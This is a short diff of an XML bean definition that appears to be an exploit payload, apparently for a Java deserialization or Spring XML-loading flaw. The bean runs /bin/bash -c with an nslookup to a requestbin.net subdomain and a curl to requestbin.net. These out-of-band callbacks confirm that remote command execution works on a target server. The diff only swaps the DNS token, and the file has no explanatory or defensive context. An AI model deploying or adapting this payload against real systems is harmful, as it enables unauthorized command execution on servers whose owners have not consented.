@@ -6,7 +6,7 @@
            <array>
                <value>/bin/bash</value>
                <value>-c</value>
-               <value>nslookup baolq.77147094c7e241e5d172.d.requestbin.net && curl -I http://requestbin.net/r/1lrrxac1?panda</value>
+               <value>nslookup baolq.6aa03564a9f160671c4d.d.requestbin.net && curl -I http://requestbin.net/r/1lrrxac1?panda</value>
            </array>
         </constructor-arg>
     </bean>
